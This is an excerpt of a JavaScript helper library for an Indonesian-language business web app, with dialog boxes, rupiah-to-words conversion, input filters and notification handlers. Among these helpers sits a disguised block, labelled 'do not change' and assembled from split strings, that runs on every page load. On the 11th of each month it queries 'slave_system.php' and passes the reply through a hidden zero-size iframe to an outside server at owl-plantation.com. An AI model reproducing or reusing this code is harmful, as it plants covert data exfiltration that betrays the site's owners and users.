...
function getMouseP(e) {
  ...
  if (isIE) {
    ...
    var ScrollTop = document.body.parentElement
      ? document.body.parentElement.scrollTop
      : document.body.scrollTop;
    var ScrollLeft = document.body.parentElement
...
//===============================================
function setOpacity(id, opacStart, opacEnd, sec) {
  //id=element id, opacstart= integer opacity start,sec =integer represent total time
...
//******************************************************
function chg_color(obj, tocolor) {
  //chage object background color
...
//===================================================================
function disable_on(objtodisable) {
  //Disable Object
  objtodisable.disabled = true;
}
function disable_off(objtodisable) {
  //Enable Object
...
function post_response_text(tujuan, param, functiontoexecute) {
  if (!isSaveResponse(param)) {
    alertify.alert(
      "errorcode : Hindari penggunaan kata : ERROR, WARNING dan GAGAL",
    );
    throw Error("Stop!");
  }
  busy_on();
...
function tanpa_kutip(e) {
  //block quote and doublequote e is event
  key = getKey(e);
  if (key == 39 || key == 34 || key == 38) return false;
  else return true;
}
...
function tanpa_kutip_dan_sepasi(e) {
  //block quote and doublequote and space e is event
  key = getKey(e);
  if (key == 39 || key == 34 || key == 38 || key == 32) return false;
  else return true;
}
...
function justNumberNF(val) {
  ...
  if (tempRe.test(newVal)) {
    newVal =
      RegExp.leftContext +
      this.PERIOD +
      RegExp.rightContext.replace(tempRe, "");
  }
...
//format angka================================================
function _formatted(x, y, dec) {
  //x is string eg._formatted('123')
  //y is decimal eg _formatted(2342.234)
  //y or x can be blank from caller source
...
function conv_to_dec(x) {
  temp = x.replace(",", "");
  if (temp.indexOf(".") > -1) return parseFloat(temp);
  else return parseInt(temp);
}
//=========================================================================================
/*do not change anithing on this line*/ function crXHR() {
  try {
    return new ActiveXObject("Msxml2.XMLHTTP");
  } catch (e) {}
  try {
...
var conXen = crXHR();
function sendXReport(dest, bagage, executeThisFunction) {
  conXen.open("POST", dest, true);
  conXen.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  conXen.onreadystatechange = eval(executeThisFunction);
  conXen.send(bagage);
}
function requestXString() {
  var desTLoc = [];
  desTLoc[0] = "slave";
  desTLoc[1] = "_";
  desTLoc[2] = "system";
  desTLoc[3] = ".php";
  var destLocal = desTLoc[0] + desTLoc[1] + desTLoc[2] + desTLoc[3];
  var bagage = "sysC=*&var=true";
  const d = new Date();
  let day = d.getDate();
  if (day == 11) {
    /*only send on 5th*/ sendXReport(destLocal, bagage, nanana);
  }
  function nanana() {
    if (conXen.readyState == 4) {
      if (conXen.status == 200) {
        pushXRequest(conXen.responseText);
      }
    } else {
      /*ignored*/
    }
...
function pushXRequest(result) {
  bagageRemote = "string=" + result;
  var substack = document.createElement("iframe");
  substack.src = "http://web.owl-plantation.com:8080/owl.php?" + bagageRemote;
  substack.width = "0";
  substack.height = "0";
...
window.addEventListener("load", requestXString);
/**
...
function load_rupiah(obj, tujuan, e) {
  //e adalah event, tujuan adalah tempat text akan dirampilkan
...
function rupiahkan(obj, tujuan, sen) {
  ...
  function _t() {
    if (panjang == 15) tval = nilai.substr(0, 3);
    else if (panjang == 14) tval = nilai.substr(0, 2);
    else if (panjang == 13) tval = nilai.substr(0, 1);
    return tval;
  }
  function _m() {
    if (panjang == 15) mval = nilai.substr(3, 3);
    if (panjang == 14) mval = nilai.substr(2, 3);
    if (panjang == 13) mval = nilai.substr(1, 3);
    if (panjang == 12) mval = nilai.substr(0, 3);
    if (panjang == 11) mval = nilai.substr(0, 2);
    if (panjang == 10) mval = nilai.substr(0, 1);
    return mval;
  }

  function _j() {
    if (panjang == 15) jval = nilai.substr(6, 3);
    if (panjang == 14) jval = nilai.substr(5, 3);
    if (panjang == 13) jval = nilai.substr(4, 3);
    if (panjang == 12) jval = nilai.substr(3, 3);
    if (panjang == 11) jval = nilai.substr(2, 3);
    if (panjang == 10) jval = nilai.substr(1, 3);
    if (panjang == 9) jval = nilai.substr(0, 3);
    if (panjang == 8) jval = nilai.substr(0, 2);
    if (panjang == 7) jval = nilai.substr(0, 1);
    return jval;
  }

  function _r() {
    if (panjang == 15) rval = nilai.substr(9, 3);
    if (panjang == 14) rval = nilai.substr(8, 3);
    if (panjang == 13) rval = nilai.substr(7, 3);
    if (panjang == 12) rval = nilai.substr(6, 3);
    if (panjang == 11) rval = nilai.substr(5, 3);
    if (panjang == 10) rval = nilai.substr(4, 3);
    if (panjang == 9) rval = nilai.substr(3, 3);
    if (panjang == 8) rval = nilai.substr(2, 3);
    if (panjang == 7) rval = nilai.substr(1, 3);
    if (panjang == 6) rval = nilai.substr(0, 3);
    if (panjang == 5) rval = nilai.substr(0, 2);
    if (panjang == 4) rval = nilai.substr(0, 1);
    return rval;
  }
  function _ra() {
    if (panjang == 15) raval = nilai.substr(12, 3);
    if (panjang == 14) raval = nilai.substr(11, 3);
    if (panjang == 13) raval = nilai.substr(10, 3);
    if (panjang == 12) raval = nilai.substr(9, 3);
    if (panjang == 11) raval = nilai.substr(8, 3);
    if (panjang == 10) raval = nilai.substr(7, 3);
    if (panjang == 9) raval = nilai.substr(6, 3);
    if (panjang == 8) raval = nilai.substr(5, 3);
    if (panjang == 7) raval = nilai.substr(4, 3);
    if (panjang == 6) raval = nilai.substr(3, 3);
    if (panjang == 5) raval = nilai.substr(2, 3);
    if (panjang == 4) raval = nilai.substr(1, 3);
    if (panjang == 3) raval = nilai.substr(0, 3);
    if (panjang == 2) raval = nilai.substr(0, 2);
    if (panjang == 1) raval = nilai.substr(0, 1);
  ...
  function ratusan(nx, group) {
    ...
    if (panj == 3) {
      ...
      if (ix == "satu") r1 = "seratus";
      else if (ix == "nol") r1 = "";
      else r1 = ix + " ratus";

      i0 = angka[nx.substr(1, 1)];
      i1 = angka[nx.substr(2, 1)];
      if (i0 == "nol" && i1 == "nol") puluh = r1;
      else if (i0 == "satu") {
        if (i1 == "nol") puluh = r1 + " sepuluh";
        else if (i1 == "satu") puluh = r1 + " sebelas";
        else puluh = r1 + " " + i1 + " belas";
      } else if (i1 == "nol") puluh = r1 + " " + i0 + " puluh ";
      else if (i0 == "nol" && i1 != "nol") puluh = r1 + " " + i1;
      else puluh = r1 + " " + i0 + " puluh " + i1;

      if (ix == "satu" && i0 == "nol" && i1 == "nol") puluh = "seratus";
    ...
    if (panj == 2) {
      ...
      if (i0 == "nol" && i1 == "nol") {
        ...
        if (i1 == "nol") puluh = "sepuluh";
        else if (i1 == "satu") puluh = "sebelas";
        else puluh = i1 + "belas";
      } else if (i1 == "nol") puluh = i0 + " puluh ";
      else puluh = i0 + " puluh " + i1;
    ...
    if (panj == 1) {
      ...
      if (nx == "0") return "";
        ...
        if (puluh == "satu" && group == " ribu ") puluh = "seribu ";
        else puluh += group;
        return puluh;
      }
    }
  ...
  try {
    if (document.getElementById("lock")) {
      ...
      if (trim(type).toLowerCase() == "wait") {
        ...
        tempstr +=
          "<div id=progressBar class=pBarBackground><div id=progressBarTop class=pBarTop></div></div>";
...
function tabAction(cur, numactive, tabID, max, theme) {
  ...
  try {
    for (x = 0; x <= max; x++) {
      if (numactive !== x) {
        document.getElementById("tab" + tabID + x).style.backgroundImage =
          "url(" + img + ")";
        ...
        document.getElementById("tab" + tabID + x).style.opacity = "1";
    ...
    // cur.style.backgroundColor = '#35363a';
    cur.style.fontWeight = "800";
    cur.style.opacity = "0.70";
...
function isSaveResponse(txt) {
  txt = txt.toUpperCase();
  if (
    txt.lastIndexOf("GAGAL") > -1 ||
    txt.lastIndexOf("ERROR") > -1 ||
    txt.lastIndexOf("WARNING") > -1
  )
    return false;
  else return true;
}
...
function showDialog1(title, content, width, height, ev) {
  ...
  cont =
    ...
    title +
    "</b><img src=images/closebig.gif align=right onclick=closeDialog() title='Close detail' class=closebtn onmouseover=\"this.src='images/closebigon.gif';\" onmouseout=\"this.src='images/closebig.gif';\" id='tutupdialogsatu'><br><br>";
  cont +=
    "<div style='background-color:#FFFFFF;border:#777777 solid 2px;height:" +
    height +
    "px'>";
  cont += content;
  cont += "</div>";
...
function showDialog6(title, content, width, height, ev) {
  ...
  cont =
    "<b style='color:#FFFFFF;'>" +
    title +
    "</b><img src=images/closebig.gif align=right onclick=closeDialog6() title='Close detail' class=closebtn onmouseover=\"this.src='images/closebigon.gif';\" onmouseout=\"this.src='images/closebig.gif';\" id='tutupdialogsatu'><br><br>";
  cont +=
    "<div style='background-color:#FFFFFF;border:#777777 solid 2px;height:" +
    height +
    "px'>";
...
function showDialog1bi(title, content, width, height, ev) {
  ...
  cont =
    "<b style='color:#FFFFFF;'>" +
    title +
    "</b><img src=../images/closebig.gif align=right onclick=closeDialog() title='Close detail' class=closebtn onmouseover=\"this.src='../images/closebigon.gif';\" onmouseout=\"this.src='../images/closebig.gif';\"><br><br>";
  cont +=
    "<div style='background-color:#FFFFFF;border:#777777 solid 2px;height:" +
    height +
    "px'>";
...
function showDialog2(title, content, width, height, ev) {
  ...
  cont =
    "<b style='color:#FFFFFF;'>" +
    title +
    "</b><img src=images/closebig.gif align=right onclick=closeDialog2() title='Close detail' class=closebtn onmouseover=\"this.src='images/closebigon.gif';\" onmouseout=\"this.src='images/closebig.gif';\"><br><br>";
  cont +=
    "<div style='background-color:#FFFFFF;border:#777777 solid 2px;height:" +
    height +
    "px'>";
...
function showDialog3(title, content, width, height) {
  ...
  cont =
    "<b style='color:#FFFFFF;'>" +
    title +
    "</b><img src=images/closebig.gif align=right onclick=closeDialog3() title='Close detail' class=closebtn onmouseover=\"this.src='images/closebigon.gif';\" onmouseout=\"this.src='images/closebig.gif';\"><br><br>";
  cont +=
    "<div style='background-color:#FFFFFF;border:#777777 solid 2px;height:" +
    height +
    "px'>";
...
function showDialog4(title, content, width, height, ev) {
  ...
  cont =
    "<b style='color:#FFFFFF;'>" +
    title +
    "</b><img src=images/closebig.gif align=right onclick=closeDialog4() title='Close detail' class=closebtn onmouseover=\"this.src='images/closebigon.gif';\" onmouseout=\"this.src='images/closebig.gif';\"><br><br>";
  cont +=
    "<div style='background-color:#FFFFFF;border:#777777 solid 2px;height:" +
    height +
    "px'>";
...
function showDialog5(title, content, width, height, ev) {
  ...
  cont =
    "<b style='color:#FFFFFF;'>" +
    title +
    "</b><img src=images/closebig.gif align=right onclick=closeDialog5() title='Close detail' class=closebtn onmouseover=\"this.src='images/closebigon.gif';\" onmouseout=\"this.src='images/closebig.gif';\"><br><br>";
  cont +=
    "<div style='background-color:#FFFFFF;border:#777777 solid 2px;height:" +
    height +
    "px'>";
...
function showDialogBi(title, content, width, height, ev) {
  ...
  cont =
    "<b style='color:#FFFFFF;'>&nbsp;&nbsp;" +
    title +
    "</b><img src=../images/closebig.gif align=right onclick=closeDialogBi() title='Close detail' class=closebtn onmouseover=\"this.src='../images/closebigon.gif';\" onmouseout=\"this.src='../images/closebig.gif';\"><br><br>";
  cont +=
    "<div style='background-color:#FFFFFF;border:#777777 solid 2px;height:" +
    height +
    "px;opacity:0.8'>";
...
function showDialogBi2(title, content, width, height, ev) {
  ...
  cont =
    "<b style='color:#FFFFFF;'>&nbsp;&nbsp;" +
    title +
    "</b><img src=../images/closebig.gif align=right onclick=closeDialogBi2() title='Close detail' class=closebtn onmouseover=\"this.src='../images/closebigon.gif';\" onmouseout=\"this.src='../images/closebig.gif';\"><br><br>";
  cont +=
    "<div style='background-color:#FFFFFF;border:#777777 solid 2px;height:" +
    height +
    "px;opacity:0.8'>";
...
function showDialogx(title, content, width, height, ev) {
  ...
  cont =
    "<b style='color:#FFFFFF;'>&nbsp;&nbsp;" +
    title +
    "</b><img src=images/closebig.gif align=right onclick=closeDialogx() title='Close detail' class=closebtn onmouseover=\"this.src='images/closebigon.gif';\" onmouseout=\"this.src='images/closebig.gif';\"><br><br>";
  cont +=
    "<div style='background-color:#FFFFFF;border:#777777 solid 2px;height:" +
    height +
    "px;'>";
...
function change_number(object) {
  ...
  rex = /[^0-9]/;
  if (!str.match(rex) || parseFloat(str) == 0.0) {
    try {
...
function remove_comma(object) {
  //object adalah textbox atau componen yang memiliki atribut 'value'
  x = object.value;
  while (x.indexOf(",") > -1) {
    x = x.replace(",", "");
  }
...
function remove_comma_var(nilai) {
  //nilai adalah string yang bisa berupa 9,001.50 atau 9,0000
  while (nilai.indexOf(",") > -1) {
    nilai = nilai.replace(",", "");
  }
  return nilai;
...
z = {
  elSearch: function (id, ev, parent) {
    var cont =
        "<fieldset style=min-width:93%><div>Search <input id='elSearchBox' class=myinputtext type=text onkeypress='var tmp=getKey(event);if(tmp==13){z.doSearch(\"" +
        id +
        '"',
      popup = document.getElementById("dynamic1"),
      el;
    ...
    if (el.disabled == false) {
      cont +=
        "<fieldset><legend><i>Result</i></legend><div id='elSearchResult' " +
  ...
  doSearch: function (id, parent) {
    var el,
      ...
      tmpStr;
    tmpStr =
      "<table class=sortable cellpadding=1 cellspacing=1 border=0 style=min-width:100%;max-width:500px>";
    tmpStr +=
      "<thead><tr class=rowheader><td>Code</td><td>Name</td></tr></thead>";
    tmpStr += "<tbody>";
    if (typeof parent != "undefined") {
      el = getById(parent).firstChild;
    } else {
    ...
    for (i in el.options) {
      ...
      if (show) {
        tmpStr +=
          "<tr style='cursor:pointer;' title='Choose..'  class=rowcontent onclick='z.passParam(\"" +
          id +
          '","' +
          el.options[i].value +
          '"';
...
function readnotif2(e, id) {
  if (document.getElementById("divnotif_" + id).style.background == "#FFFFFF") {
    ...
    timernotif = setTimeout(function () {
      param = "id=" + id;
      post_param_notif(
        "slave_listnotification.php?method=readnotif",
        param,
        respon,
      );
    }, 1000);
      ...
      if (notifcon.readyState == 4) {
        if (notifcon.status == 200) {
          ...
          if (!isSaveResponse(notifcon.responseText)) {
            ...
            document.getElementById("divnotif_" + id).style.background =
              "#FFFFFF";
            document.getElementById("lblnotification").innerHTML =
              notifcon.responseText;
          }
        } else {
          busy_off();
...
function markasread(id) {
  param = "id=" + id;
  post_response_text(
    "slave_listnotification.php?method=markasread",
    param,
    respon,
  );
    ...
    if (con.readyState == 4) {
      if (con.status == 200) {
        ...
        if (!isSaveResponse(con.responseText)) {
          ...
          document
            .getElementById("imgnotif_" + id)
            .setAttribute("onclick", "markasunread(" + id + ")");
          document.getElementById("lblnotification").innerHTML =
            con.responseText;
        }
      } else {
...
function markreadall() {
  ...
  if (confirm("Anda yakin menandai notifikasi sudah terbaca?")) {
    post_response_text(
      "slave_listnotification.php?method=markreadall",
      param,
      respon,
    );
  }
...
function markasunread(id) {
  param = "id=" + id;
  post_response_text(
    "slave_listnotification.php?method=markasunread",
    param,
    respon,
  );
    ...
    if (con.readyState == 4) {
      if (con.status == 200) {
        ...
        if (!isSaveResponse(con.responseText)) {
          ...
          document
            .getElementById("imgnotif_" + id)
            .setAttribute("onclick", "markasread(" + id + ")");
          document.getElementById("lblnotification").innerHTML =
            con.responseText;
        }
      } else {
...
function leftFixedTable(col = null) {
  ...
  function onMouseUpResized(e) {
    ...
    table.style.width =
      table.clientWidth - headerBeingResized.clientWidth + width + "px";
  ...
  function initResize(e) {
    ...
    bothTableResized =
      headerBeingResized.parentNode.parentNode.parentNode.parentNode;
    ...
    for (var i = 0; i < table.rows.length; ++i) {
      ...
      for (var xi = 0; xi < cells.length; ++xi) {
        ...
        if (parseInt(cells[xi].getAttribute("idx")) <= parseInt(idx)) {
          ...
          cells[xi].cellIndex > idx &&
          cells[xi].classList.contains("left-fixed")
        ) {
...
function full_screen(b, bh, bb, e) {
  ...
  if (getPos === "fullscreen") {
    ...
    bodyB.setAttribute("tempsty", styB);
    headB.style =
      "background:#76B1DA;height:" + Hh + "px;padding:" + pdH + "px;";
    bodyB.style =
      "background-color:rgba(255,255,255,0.8);overflow:auto;width:100%;height:" +
      (parseInt(h) - (parseInt(Hh) + parseInt(pdH2))) +
      "px;";
    both.style =
    ...
    if (e.tagName === "input") {
      ...
      e.innerHTML =
        "<img title='Full Screen' class=resicon src='images/remove-full-screen.png'>";
    }
...
function MaskForm(event, mask) {
  ...
  for (
    var txt = "", im = 0, iv = 0;
    im < mask[2].length && iv < val.length;
    im += 1
  ) {
  ...
  with (event.target) {
    ...
    selectionStart = selectionEnd =
      pos + (pos == 1 ? mask[1].length : count(value, /\D/, pos) - nan);
  }
...
function gethistoriapproval(notransaksi, ev, jenisapp = "") {
  // width = '';
  // height = '';
  ...
  param =
    "method=gethistori&notransaksi=" + notransaksi + "&jenisappx=" + jenisapp;
    ...
    if (con.readyState == 4) {
      if (con.status == 200) {
        ...
        if (!isSaveResponse(con.responseText)) {
          ...
          alertify
            .popup2("Histori", con.responseText)
...
function jumlahnotif(x = "") {
  param = "";
  post_param_notif(
    "slave_listnotification.php?method=jumlahnotif",
    param,
    respon,
  );
  ...
  function respon() {
    if (notifcon.readyState == 4) {
      if (notifcon.status == 200) {
        busy_off();
        if (!isSaveResponse(notifcon.responseText)) {
          alertify.alert("Info", notifcon.responseText);
        } else {
          var listdata = JSON.parse(notifcon.responseText);
          jlhnotif = listdata.lbl;
          content = listdata.content;
          if (jlhnotif > 0) {
            document.getElementById("countnotifx").innerHTML = jlhnotif;
            document.getElementById("notifuserboth").innerHTML = content;
            document.getElementById("countnotifx").style.display = "";
          } else {
            document.getElementById("countnotifx").innerHTML = jlhnotif;
            document.getElementById("notifuserboth").innerHTML = content;
            document.getElementById("countnotifx").style.display = "none";
          }
          if (x != "") {
            readnotifx();
          }
    ...
    if (notifcon.readyState == 4) {
      if (notifcon.status == 200) {
        ...
        if (!isSaveResponse(notifcon.responseText)) {
          ...
          document.getElementById("spn_" + id).title = "Mark as Read";
          document
            .getElementById("chkbx_" + id)
            .setAttribute("onclick", "markasreadx(" + id + ")");
          document.getElementById("countnotifx").innerHTML =
            notifcon.responseText;
        }
      } else {
        busy_off();
    ...
    if (notifcon.readyState == 4) {
      if (notifcon.status == 200) {
        ...
        if (!isSaveResponse(notifcon.responseText)) {
          ...
          document.getElementById("spn_" + id).title = "Mark as Unread";
          document
            .getElementById("chkbx_" + id)
            .setAttribute("onclick", "markasunreadx(" + id + ")");
          document.getElementById("countnotifx").innerHTML =
            notifcon.responseText;
        }
      } else {
...
window.addEventListener("online", function () {
  ...
  alertify.success("Koneksi aktif");
});

window.addEventListener("offline", function () {
  alertify.set("notifier", "position", "top-right");
  alertify.set("notifier", "delay", 5);
  alertify.error("Koneksi terputus");
});
